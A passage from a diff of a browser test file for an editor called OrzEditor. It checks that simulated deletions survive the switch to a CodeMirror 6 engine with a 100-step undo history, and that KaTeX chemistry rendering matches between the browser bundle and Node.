+      for (let i = 0; i < n; i++) {
+        const v = ta.value;
+        const at = 1000 + ((i * 7919) % (v.length - 2000));
+        ta.value = v.slice(0, at) + v.slice(at + 5);
+        ta.setSelectionRange(at, at);
+        ta.dispatchEvent(new InputEvent('input', { inputType: 'deleteContentBackward', bubbles: true }));
+        if (i >= n - 3) out.push(w.shell_c.getText());
+      }
+      Date.now = real;
+      return out;
+    }, 200);
+    const r = await p.evaluate(async () => {
+      const w = window as unknown as Record<string, unknown> & { shell_c: { ready: Promise<{ engine: string }>; adapter: { name: string } } };
+      const t0 = performance.now();
+      (w.__open as () => void)();
+      const ready = await w.shell_c.ready;
+      return { engine: ready.engine, ms: performance.now() - t0 };
+    });
+    expect(r.engine).toBe('codemirror6');
+    expect(r.ms).toBeLessThan(4000);
+    expect(await p.evaluate('shell_c.getText() === ' + JSON.stringify(states[2]))).toBe(true);
+    expect(await p.evaluate('[shell_c.undo(), shell_c.getText() === ' + JSON.stringify(states[1]) + ', shell_c.undo(), shell_c.getText() === ' + JSON.stringify(states[0]) + ']')).toEqual([true, true, true, true]);
+    expect(await p.evaluate('(function () { var n = 2; while (shell_c.undo() && n < 500) n++; return n; })()')).toBe(100);
+    await p.close();
+  }, 90_000);
+
+  it('[E.13] [E.10] the test bundle renders \\ce with the one KaTeX the shipped CommonJS build uses (mhchem registered on the copy that renders)', async () => {
+    const p = await open();
+    const html = await p.evaluate('OrzEditor.renderMarkdownPreview("$\\\\ce{H2O}$")') as string;
+    expect(html).toContain('class="katex"');
+    expect(html).not.toContain('katex-error');
+    expect(html).toBe(renderMarkdownPreview('$\\ce{H2O}$')); // what Node (and the CommonJS build) renders
     await p.close();
   });
 });
